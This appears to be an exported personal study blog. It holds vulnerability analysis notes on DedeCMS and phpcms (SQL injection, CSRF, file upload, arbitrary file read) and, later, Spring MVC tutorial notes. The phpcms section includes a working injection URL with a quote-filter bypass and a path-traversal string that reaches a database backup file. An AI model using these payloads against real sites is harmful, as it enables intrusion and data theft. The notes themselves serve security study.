<h3 id="3-3-Dedecms的download文件的sql注入分析"><a href="#3-3-Dedecms的download文件的sql注入分析" class="headerlink" title="3-3 Dedecms的download文件的sql注入分析"></a>3-3 Dedecms的download文件的sql注入分析</h3><p><img src="/2020/10/12/dedecms%E6%BC%8F%E6%B4%9E/dedecms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cdedecms%E6%BC%8F%E6%B4%9E%5Cimage-20201017144348461.png" alt="image-20201017144348461"></p>
<p><img src="/2020/10/12/dedecms%E6%BC%8F%E6%B4%9E/dedecms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cdedecms%E6%BC%8F%E6%B4%9E%5Cimage-20201017145304722.png" alt="image-20201017145304722"></p>
<p>两个数组还原之后的东西</p>
<p><img src="/2020/10/12/dedecms%E6%BC%8F%E6%B4%9E/dedecms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cdedecms%E6%BC%8F%E6%B4%9E%5Cimage-20201017150147791.png" alt="image-20201017150147791"></p>
<p><img src="/2020/10/12/dedecms%E6%BC%8F%E6%B4%9E/dedecms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cdedecms%E6%BC%8F%E6%B4%9E%5Cimage-20201017150256856.png" alt="image-20201017150256856"></p>
<p>如果全局把mysqli功能模块关闭的话，就可以进入存在漏洞的数据库类。</p>
<p><img src="/2020/10/12/dedecms%E6%BC%8F%E6%B4%9E/dedecms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cdedecms%E6%BC%8F%E6%B4%9E%5Cimage-20201017151526059.png" alt="image-20201017151526059"></p>
<p>$v1变量赋值</p>
<p><img src="/2020/10/12/dedecms%E6%BC%8F%E6%B4%9E/dedecms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cdedecms%E6%BC%8F%E6%B4%9E%5Cimage-20201017173643497.png" alt="image-20201017173643497"></p>
<p>漏洞存在的地方会进行替换。</p>
<p><img src="/2020/10/12/dedecms%E6%BC%8F%E6%B4%9E/dedecms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cdedecms%E6%BC%8F%E6%B4%9E%5Cimage-20201017173715664.png" alt="image-20201017173715664"></p>
<h4 id="2-sql拿shell"><a href="#2-sql拿shell" class="headerlink" title="2 sql拿shell"></a>2 sql拿shell</h4><p><img src="/2020/10/12/dedecms%E6%BC%8F%E6%B4%9E/dedecms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cdedecms%E6%BC%8F%E6%B4%9E%5Cimage-20201017171121576.png" alt="image-20201017171121576"></p>
<p><img src="/2020/10/12/dedecms%E6%BC%8F%E6%B4%9E/dedecms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cdedecms%E6%BC%8F%E6%B4%9E%5Cimage-20201017165717082.png" alt="image-20201017165717082"></p>
<p>跟到最后在这执行的php语句</p>
<p>总结：其实这些漏洞最根本的初始原因都是<strong>全局变量的覆盖</strong>再去执行没有过滤的语句。</p>
<h3 id="3-5-DedeCMS的recommend文件的SQL注入漏洞"><a href="#3-5-DedeCMS的recommend文件的SQL注入漏洞" class="headerlink" title="3-5 DedeCMS的recommend文件的SQL注入漏洞"></a>3-5 DedeCMS的recommend文件的SQL注入漏洞</h3><p>版本20140201之前的5.7通杀SQL注入漏洞</p>
<p><img src="/2020/10/12/dedecms%E6%BC%8F%E6%B4%9E/dedecms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cdedecms%E6%BC%8F%E6%B4%9E%5Cimage-20201018145845867.png" alt="image-20201018145845867"></p>
<p><img src="/2020/10/12/dedecms%E6%BC%8F%E6%B4%9E/dedecms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cdedecms%E6%BC%8F%E6%B4%9E%5Cimage-20201018150117241.png" alt="image-20201018150117241"></p>
<p>mysql特殊语法mysql边界注入</p>
<p><img src="/2020/10/12/dedecms%E6%BC%8F%E6%B4%9E/dedecms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cdedecms%E6%BC%8F%E6%B4%9E%5Cimage-20201018150650782.png" alt="image-20201018150650782"></p>
<p>检测出版本信息。</p>
<h3 id="3-5-DedeCMS友情链接的CSRF漏洞分析"><a href="#3-5-DedeCMS友情链接的CSRF漏洞分析" class="headerlink" title="3-5 DedeCMS友情链接的CSRF漏洞分析"></a>3-5 DedeCMS友情链接的CSRF漏洞分析</h3><p><img src="/2020/10/12/dedecms%E6%BC%8F%E6%B4%9E/dedecms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cdedecms%E6%BC%8F%E6%B4%9E%5Cimage-20201018142714271.png" alt="image-20201018142714271"></p>
<p><img src="/2020/10/12/dedecms%E6%BC%8F%E6%B4%9E/dedecms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cdedecms%E6%BC%8F%E6%B4%9E%5Cimage-20201018143544643.png" alt="image-20201018143544643"></p>
]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>phpcms漏洞/phpcms漏洞</title>
    <url>/2020/10/14/phpcms%E6%BC%8F%E6%B4%9E/phpcms%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h3 id="phpcmsV9-2-文件上传漏洞"><a href="#phpcmsV9-2-文件上传漏洞" class="headerlink" title="phpcmsV9.2 文件上传漏洞"></a>phpcmsV9.2 文件上传漏洞</h3><p><img src="/2020/10/14/phpcms%E6%BC%8F%E6%B4%9E/phpcms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cphpcms%E6%BC%8F%E6%B4%9E%5Cimage-20201014122531999.png" alt="image-20201014122531999"></p>
<p>很清楚的可以发现虽然他对文件做了安全检查。简单读一下：1、打开文件句柄，如果文件名不存在，删除这些文件2、或者没有读取到imagesize就删除文件。</p>
<p>但是此处有个漏洞：这段代码只打开了一层目录，并没有对目录做一个递归审查。所以我们只要将恶意代码放在一个文件夹中并压缩。</p>
<h3 id="phpcmsV9-6-0-文件上传漏洞"><a href="#phpcmsV9-6-0-文件上传漏洞" class="headerlink" title="phpcmsV9.6.0 文件上传漏洞"></a>phpcmsV9.6.0 文件上传漏洞</h3><p><img src="/2020/10/14/phpcms%E6%BC%8F%E6%B4%9E/phpcms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cphpcms%E6%BC%8F%E6%B4%9E%5Cimage-20201014155421317.png" alt="image-20201014155421317"></p>
<p><img src="/2020/10/14/phpcms%E6%BC%8F%E6%B4%9E/phpcms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cphpcms%E6%BC%8F%E6%B4%9E%5Cimage-20201014155447705.png" alt="image-20201014155447705"></p>
<p>将info数组内的每个元素执行new_html_special_chars函数转义防止xss漏洞。</p>
<p><img src="/2020/10/14/phpcms%E6%BC%8F%E6%B4%9E/phpcms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cphpcms%E6%BC%8F%E6%B4%9E%5Cimage-20201014160149259.png" alt="image-20201014160149259"></p>
<p><img src="/2020/10/14/phpcms%E6%BC%8F%E6%B4%9E/phpcms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cphpcms%E6%BC%8F%E6%B4%9E%5Cimage-20201014155641130.png" alt="image-20201014155641130"></p>
<p><img src="/2020/10/14/phpcms%E6%BC%8F%E6%B4%9E/phpcms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cphpcms%E6%BC%8F%E6%B4%9E%5Cimage-20201014161306820.png" alt="image-20201014161306820"></p>
<p>string值分割开就是matches变量。</p>
<p><img src="/2020/10/14/phpcms%E6%BC%8F%E6%B4%9E/phpcms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cphpcms%E6%BC%8F%E6%B4%9E%5Cimage-20201014165344673.png" alt="image-20201014165344673"></p>
<p>modelid改变使进入的id改变 info字段变成content之后可以调用edit方法利用。在这个方法中，调用了 <strong>attachment</strong> 类的 <strong>download</strong> 方法。(下图对应文件位置：caches/caches_model/caches_data/member_input.class.php)【对用户输入没有过滤并且可以调用类的任意方法】</p>
<p><img src="/2020/10/14/phpcms%E6%BC%8F%E6%B4%9E/phpcms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cphpcms%E6%BC%8F%E6%B4%9E%5Cimage-20201014165627983.png" alt="image-20201014165627983"></p>
<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p><img src="/2020/10/14/phpcms%E6%BC%8F%E6%B4%9E/phpcms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cphpcms%E6%BC%8F%E6%B4%9E%5Cimage-20201014162933168.png" alt="image-20201014162933168"></p>
<h3 id="phpcmsV9-6-0-注入漏洞"><a href="#phpcmsV9-6-0-注入漏洞" class="headerlink" title="phpcmsV9.6.0 注入漏洞"></a>phpcmsV9.6.0 注入漏洞</h3><h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><p><img src="/2020/10/14/phpcms%E6%BC%8F%E6%B4%9E/phpcms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cphpcms%E6%BC%8F%E6%B4%9E%5Cimage-20201015110407664.png" alt="image-20201015110407664"></p>
<p><img src="/2020/10/14/phpcms%E6%BC%8F%E6%B4%9E/phpcms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cphpcms%E6%BC%8F%E6%B4%9E%5Cimage-20201015140727299.png" alt="image-20201015140727299"></p>
<p>获取到cookie（Set-Cookie: HbVER_siteid=eee74kk8Q6M0JK_LDZRoaGcUN0JxoYJJlDzYzOo1）</p>
<h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><p>index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=&amp;id=%*27 updatexml(1,concat(1,(user())),1)#&amp;m=1&amp;f=haha&amp;modelid=2&amp;catid=7&amp;</p>
<p><img src="/2020/10/14/phpcms%E6%BC%8F%E6%B4%9E/phpcms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cphpcms%E6%BC%8F%E6%B4%9E%5Cimage-20201015110900769.png" alt="image-20201015110900769"></p>
<p>post cookie然后再方框内的字段并获取到加密的json值</p>
<p>HbVER_att_json: a4behm53SN72JlhYpAA_MM5_t7Odsp2Ayv9KnvpRGANrVTDpYmu5TllecavfOO-5VsTouF3abSBZTAcG2Q</p>
<p><img src="/2020/10/14/phpcms%E6%BC%8F%E6%B4%9E/phpcms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cphpcms%E6%BC%8F%E6%B4%9E%5Cimage-20201015122449623.png" alt="image-20201015122449623"></p>
<p><img src="/2020/10/14/phpcms%E6%BC%8F%E6%B4%9E/phpcms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cphpcms%E6%BC%8F%E6%B4%9E%5Cimage-20201015122049534.png" alt="image-20201015122049534"></p>
<p>这个类构造时会会检查userid元素 前面的都没有就执行sysauth($_POST[‘userid_flash’],’DECODE’)这个函数。</p>
<p><img src="/2020/10/14/phpcms%E6%BC%8F%E6%B4%9E/phpcms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cphpcms%E6%BC%8F%E6%B4%9E%5Cimage-20201015123621479.png" alt="image-20201015123621479"></p>
<p><img src="/2020/10/14/phpcms%E6%BC%8F%E6%B4%9E/phpcms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cphpcms%E6%BC%8F%E6%B4%9E%5Cimage-20201015123646134.png" alt="image-20201015123646134"></p>
<p>%*27简单的过滤绕过字符串的拼接</p>
<h3 id="phpcmsV9-6-1-任意文件读取漏洞"><a href="#phpcmsV9-6-1-任意文件读取漏洞" class="headerlink" title="phpcmsV9.6.1 任意文件读取漏洞"></a>phpcmsV9.6.1 任意文件读取漏洞</h3><p><img src="/2020/10/14/phpcms%E6%BC%8F%E6%B4%9E/phpcms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cphpcms%E6%BC%8F%E6%B4%9E%5Cimage-20201015171759480.png" alt="image-20201015171759480"></p>
<p>最关键的漏洞成因在最后一步将所有的尖括号过滤了，这样完美将p&lt;hp的后缀改成php造成任意文件下载。</p>
<h3 id="phpcmsV9-暴力猜解备份数据库文件名"><a href="#phpcmsV9-暴力猜解备份数据库文件名" class="headerlink" title="phpcmsV9 暴力猜解备份数据库文件名"></a>phpcmsV9 暴力猜解备份数据库文件名</h3><p><img src="/2020/10/14/phpcms%E6%BC%8F%E6%B4%9E/phpcms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cphpcms%E6%BC%8F%E6%B4%9E%5Cimage-20201016153054313.png" alt="image-20201016153054313"></p>
<p>备份数据库</p>
<p><img src="/2020/10/14/phpcms%E6%BC%8F%E6%B4%9E/phpcms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cphpcms%E6%BC%8F%E6%B4%9E%5Cimage-20201016153327099.png" alt="image-20201016153327099"></p>
<p><img src="/2020/10/14/phpcms%E6%BC%8F%E6%B4%9E/phpcms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cphpcms%E6%BC%8F%E6%B4%9E%5Cimage-20201016153730631.png" alt="image-20201016153730631"></p>
<p>PHP的文件操作函数均调用了opendir，。整个利用链传入txt参数进入判断，再利用fileexit函数</p>
<p><img src="/2020/10/14/phpcms%E6%BC%8F%E6%B4%9E/phpcms%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cphpcms%E6%BC%8F%E6%B4%9E%5Cimage-20201016171151676.png" alt="image-20201016171151676"></p>
<p>“D:\wamp64\www\<a href="http://www.cms.com\0\phpcms\libs\data\font\../../../../../../caches/backup/default/e8ael993ziym2t6pp4ak_db_20201016_1l.sql&quot;" target="_blank" rel="noopener">www.cms.com\0\phpcms\libs\data\font\../../../../../../caches/backup/default/e8ael993ziym2t6pp4ak_db_20201016_1l.sql&quot;</a></p>
]]></content>
  </entry>
  <entry>
    <title>php靶场漏洞分析实战</title>
    <url>/2020/05/10/php%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/php%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<h1 id="php靶场漏洞分析实战"><a href="#php靶场漏洞分析实战" class="headerlink" title="php靶场漏洞分析实战"></a>php靶场漏洞分析实战</h1><h2 id="2-1-ZVulDrill的注入漏洞测试"><a href="#2-1-ZVulDrill的注入漏洞测试" class="headerlink" title="2-1 ZVulDrill的注入漏洞测试"></a>2-1 ZVulDrill的注入漏洞测试</h2><p><img src="/2020/05/10/php%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/php%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/E:%5Cblog%5Csource_posts%5Cphp%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%5Cimage-20201006170611625.png" alt="image-20201006170611625"></p>
]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>spring mvc学习/spring mvc学习</title>
    <url>/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h3 id="72-76-Spring集成web环境"><a href="#72-76-Spring集成web环境" class="headerlink" title="72-76 Spring集成web环境"></a>72-76 Spring集成web环境</h3><p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201104173428114.png" alt="image-20201104173428114"></p>
<p>service和dao实现注入之后，添加web层的实现注入</p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201104173642202.png" alt="image-20201104173642202"></p>
<p>配置web层的代码获取配置文件并调用save方法。</p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201104173623713.png" alt="image-20201104173623713"></p>
<p>进行servlet的配置</p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201104173757867.png" alt="image-20201104173757867"></p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201104173817128.png" alt="image-20201104173817128"></p>
<h4 id="ContextLoaderListener监听器分析"><a href="#ContextLoaderListener监听器分析" class="headerlink" title="ContextLoaderListener监听器分析"></a>ContextLoaderListener监听器分析</h4><p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201105113312353.png" alt="image-20201105113312353"></p>
<h4 id="自定义ContextListener"><a href="#自定义ContextListener" class="headerlink" title="自定义ContextListener"></a>自定义ContextListener</h4><p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201105113633424.png" alt="image-20201105113633424"></p>
<p>init和destory方法（这个接口具有）</p>
<p>2、配置监听器对象</p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201105113744560.png" alt="image-20201105113744560"></p>
<p>3、在方法体中获取对象再调用业务</p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201105114010726.png" alt="image-20201105114010726"></p>
<h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>1、配置applicationContext全局初始化参数</p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201105114518293.png" alt="image-20201105114518293"></p>
<p>2、读取</p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201105114716557.png" alt="image-20201105114716557"></p>
<p>3、自定义一个工具类</p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201105115118218.png" alt="image-20201105115118218"></p>
<p>4、通过自定义工具类的静态方法获取应用上下文</p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201105115816490.png" alt="image-20201105115816490"></p>
<h4 id="1-2"><a href="#1-2" class="headerlink" title="1.2"></a>1.2</h4><p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201105120031667.png" alt="image-20201105120031667"></p>
<p>1、在pom.xml中导入坐标，并在web.xml配置好监听器和类加载路径    </p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201105120229588.png" alt="image-20201105120229588"></p>
<p>2、使用springcontext的工具包</p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201105120517969.png" alt="image-20201105120517969"></p>
<p>所选的位置用父类接口去接收也是可以的。（ApplicationContext）</p>
<h3 id="77-80、-SpringMVC简介"><a href="#77-80、-SpringMVC简介" class="headerlink" title="77-80、 SpringMVC简介"></a>77-80、 SpringMVC简介</h3><p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201105120831953.png" alt="image-20201105120831953"></p>
<p>Serlet内部执行的动作：1、接收请求参数2、封装实体3、访问业务层4、接收返回结果5、指派init？</p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201105122751789.png" alt="image-20201105122751789"></p>
<h4 id="SpringMVC快速入门"><a href="#SpringMVC快速入门" class="headerlink" title="SpringMVC快速入门"></a>SpringMVC快速入门</h4><p>1、2、在pom.xml中配置spring-mvc的坐标，并在web.xml中配置前端控制器和映射关系</p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201105123208377.png" alt="image-20201105123208377"></p>
<p>/代表所有访问都要先经过前端控制器。</p>
<p>3、配置视图和Controller</p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201105123433179.png" alt="image-20201105123433179"></p>
<p>4、配置映射、注解</p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201105123534677.png" alt="image-20201105123534677"></p>
<h3 id="81-84SpringMVC组件解析"><a href="#81-84SpringMVC组件解析" class="headerlink" title="81-84SpringMVC组件解析"></a>81-84SpringMVC组件解析</h3><h4 id="3-1"><a href="#3-1" class="headerlink" title="3.1"></a>3.1</h4><p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116094128909.png" alt="image-20201116094128909"></p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116094322265.png" alt="image-20201116094322265"></p>
<h4 id="注解解析"><a href="#注解解析" class="headerlink" title="注解解析"></a>注解解析</h4><p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116094604188.png" alt="image-20201116094604188"></p>
<p>user模块的quick方法。此处要改成”/success.jsp”，代表从当前应用下寻找资源。</p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116095316089.png" alt="image-20201116095316089"></p>
<h4 id="3-3"><a href="#3-3" class="headerlink" title="3.3"></a>3.3</h4><p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116095453713.png" alt="image-20201116095453713"></p>
<p>controller， servicer都需要进行组件扫描。</p>
<p>组件属于context命名空间，再指定去扫描包。各自扫描各自层 。业务层,dao层包括其他组件归spring去扫描</p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116095858232.png" alt="image-20201116095858232"></p>
<p>分清楚include和exclude</p>
<p>处理器映射器，处理器是配置器，视图解析器都可以进行映射</p>
<p>转发：看到了视图但是地址没有发生变化，服务器内部做了转发。</p>
<p>重定向：服务器内部让用户重定向到一个站点，url地址改变。</p>
<p>手动指定内部资源视图解析器：</p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116101709303.png" alt="image-20201116101709303"></p>
<h4 id="3-5-组件解析知识点回顾"><a href="#3-5-组件解析知识点回顾" class="headerlink" title="3.5 组件解析知识点回顾"></a>3.5 组件解析知识点回顾</h4><p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116101919774.png" alt="image-20201116101919774"></p>
<p><strong>1、前端控制器：调用其他的功能组件</strong></p>
<p>2、处理器映射器：返回对应的执行链。根据url请求去匹配bean的name属性url，从而获取Controller</p>
<p>3、处理器适配器：被前端控制器调用，帮我执行我的处理器，调用处理器相应的功能。调用controller里面方法，返回modelAndView</p>
<p>4、处理器：处理器对象 （相当于controller）对特有行为进行一个封装的组件</p>
<p>5、视图解析器：因为上面的处理器返回的是一个model and view。将这个view解析出来</p>
<p>6、视图：封装了一些视图的信息</p>
<p>requestmapping可以放到类上也可以放到方法上。如果都写了，要拼到一起对应的映射值才是映射的地址。</p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116112231852.png" alt="image-20201116112231852"></p>
<p>整个处理过程从一个HTTP请求开始：<br>   1、可发发起HTTP请求<br>   2、DispatcherServlet接收到请求后，根据对应配置文件中配置的处理器映射，找到对应的处理器映射项（HandlerMapping、HandlerExecutionChain），根据配置的映射规则，找到对应的处理器（Handler）和拦截器<br>   3、调用相应处理器处理器适配器<br>   4、转换消息和数据，执行响应拦截器处理方法<br>   5、调用相应处理器（Handler， 即Controller类）中的处理方法，处理该请求，处理器处理结束后会将一个ModelAndView类型的数据传给DispatcherServlet，这其中包含了处理结果的视图和视图中要使用的数据<br>   6、DispatcherServlet根据得到的ModelAndView中的视图对象，找到一个合适的ViewResolver（视图解析器）<br>   7、根据视图解析器的配置，DispatcherServlet将视图要显示的数据传给对应的视图<br>   8、最后给浏览器构造一个HTTP响应。</p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116112222074.png" alt="image-20201116112222074"></p>
<h3 id="86-95-SpringMVC的数据响应"><a href="#86-95-SpringMVC的数据响应" class="headerlink" title="86-95 SpringMVC的数据响应"></a>86-95 SpringMVC的数据响应</h3><p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116112812440.png" alt="image-20201116112812440"></p>
<h4 id="1-2-页面跳转-字符串返回"><a href="#1-2-页面跳转-字符串返回" class="headerlink" title="1.2 页面跳转 字符串返回"></a>1.2 页面跳转 字符串返回</h4><p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116113017269.png" alt="image-20201116113017269"></p>
<h4 id="1-1、modelandview返回"><a href="#1-1、modelandview返回" class="headerlink" title="1.1、modelandview返回"></a>1.1、modelandview返回</h4><p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116113557288.png" alt="image-20201116113557288"></p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116113616041.png" alt="image-20201116113616041"></p>
<h4 id="1-2-注入思想"><a href="#1-2-注入思想" class="headerlink" title="1.2 注入思想"></a>1.2 注入思想</h4><p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116113947974.png" alt="image-20201116113947974"></p>
<p>springmvc为你提供这个对象，然后你去注入进行返回。springmvc框架调用就由他去创造实参，既然不为空就可以下面直接使用</p>
<h4 id="1-3"><a href="#1-3" class="headerlink" title="1.3"></a>1.3</h4><p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116114327046.png" alt="image-20201116114327046"></p>
<h4 id="1-4"><a href="#1-4" class="headerlink" title="1.4"></a>1.4</h4><p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116114708072.png" alt="image-20201116114708072"></p>
<p>原生javaweb的方式不常用，用springmvc model对象去解耦合。</p>
<h4 id="2-1-回写数据-直接返回字符串"><a href="#2-1-回写数据-直接返回字符串" class="headerlink" title="2.1 回写数据 直接返回字符串"></a>2.1 回写数据 直接返回字符串</h4><p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116115135424.png" alt="image-20201116115135424"></p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116120058938.png" alt="image-20201116120058938"></p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116120528515.png" alt="image-20201116120528515"></p>
<p>导入jackson实现对象转化成json格式字符串。</p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116120621962.png" alt="image-20201116120621962"></p>
